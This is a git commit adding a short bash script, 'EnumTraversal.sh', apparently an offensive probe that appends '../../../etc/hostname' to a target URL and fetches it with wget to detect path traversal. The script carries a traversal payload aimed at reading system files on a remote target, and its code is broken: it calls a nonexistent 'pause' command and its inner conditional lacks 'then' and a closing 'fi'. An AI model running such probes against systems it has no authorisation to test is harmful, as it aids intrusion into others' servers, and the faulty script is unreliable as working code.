8aaa2e5453b5e78256373cc13a216a2136668cb4
dTMP3st <ThiagoMirandaDePaula@gmail.com>
2024-03-26 19:16:56 -0300

    Implementation of the code base.

---
+++ EnumTraversal.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+clear
+
+BannerFunction(){
+	echo "		+==================================================+"
+	echo "		|			EnumTraversal              |"
+	echo "		|	        dTMP3st - Cyber Strike Force	   |"
+	echo "		|	   	     Version - 1.0                 |"
+	echo "		+==================================================+"
+}
+
+if [ "$1" == "" ]; then
+    BannerFunction
+    echo "Use mode: ./$0 Target"
+else
+    BannerFunction
+    echo ""
+    wget $1=../../../etc/hostname -O Validation.txt
+    pause 2s
+    Validation=$(cat Validation.txt)
+    if [ "$Validation" != "" ];
+        echo "The application is vulnerable to Path traversal"
+    else
+        echo "The application is not vulnerable to Path traversal"
+fi
